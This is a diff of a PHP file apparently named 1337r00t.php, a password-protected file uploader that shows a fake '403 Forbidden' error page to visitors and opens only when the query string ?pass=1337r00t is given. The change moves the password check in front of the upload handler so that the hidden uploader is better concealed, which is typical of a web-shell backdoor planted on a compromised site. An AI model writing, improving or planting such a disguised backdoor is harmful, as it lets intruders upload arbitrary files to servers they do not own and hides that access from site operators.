@@ -1,4 +1,4 @@
- <?php
+<?php
 ///////////////////////////////////////////////////////////
 //
 // ex : localhost/1337r00t.php?pass=1337r00t
@@ -12,6 +12,15 @@ Server unable to read  file, denying access to be safe
 <br><br>
 Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>";
  
+/////////////////////////////////////////////////////////////////////
+$password ="1337r00t";   // Your Password
+/////////////////////////////////////////////////////////////////////
+if($_GET['pass']==$password){
+/*
+
+Fixed Bug #1
+
+*/
 if(isset($_POST['uploaded']))
 {
 $file = $_FILES['files']['name'];
@@ -26,10 +35,7 @@ else
 $result = "Fail -_- Try...";
 }
 }
-/////////////////////////////////////////////////////////////////////
-$password ="1337r00t";   // Your Password
-/////////////////////////////////////////////////////////////////////
-if($_GET['pass']==$password){
+
 echo'
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
